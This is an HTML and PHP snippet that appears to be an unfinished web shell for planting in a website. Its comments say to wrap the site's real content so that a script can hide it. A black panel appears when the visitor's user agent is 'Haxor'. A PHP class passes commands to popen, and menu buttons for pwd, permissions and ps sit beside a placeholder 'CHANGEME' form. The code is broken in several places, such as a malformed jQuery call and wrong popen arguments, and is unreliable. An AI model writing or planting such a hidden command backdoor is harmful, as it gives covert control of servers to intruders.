<!-- Above here, should be the end of the content in the <body> tag -->
<!-- Place the entire content in a <div id="luserContent"> tag  -->

<!-- Don't include this jQuery API if it's already included on the site -->
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script type="text/javascript">
	$(document).ready( function() {
		if( navigator.userAgent == "Haxor" ) {
			$("#haxored").prop("hidden",false);
			$("#luserContent").prop("hidden,true):
		}
	});
</script>
<div id="haxored" style='width: 100%; height: 100%; background-color: black'>
<?php
	class UserInterface
	{
		public $pwd = "";
		private $currentUser = "";
		private $mode = "w";
		private $errorToo = '2>&1';
		private $command = "";

		public function doCommand($command)
		{
			$mode = $this->mode;
			echo popen($command,$command);
		}
		
		public function getPwd()
		{
			$this->pwd = popen("/bin/pwd",$this->mode);
			echo $pwd;
		}

		public function cd($path)
		{
			chdir($path);
		}
	}
?>
<style rel="stylesheet" type="text/css">
</style>
<div id="Xcontainer">
	<div id="XmenuNav">
		<ul class="XmenuOptions">
			<li><span id="XbuttonPwd">
			<li><span id="XbuttonPerm">
			<li><span id="XbuttonPs">
		</ul>
	</div>
	<div id="XmainContainer">
		<div id="XmainShell">
			<form action="CHANGEME" method="POST">

		<div id="XsideBar">
			<ul>
				<li>Something here?</li>
				<li>or here</li>
				<li>or here</li>
			</ul>
		</div>
<script type="text/javascript">
	
</script>

<!-- Below here should be the closing </body> tag -->
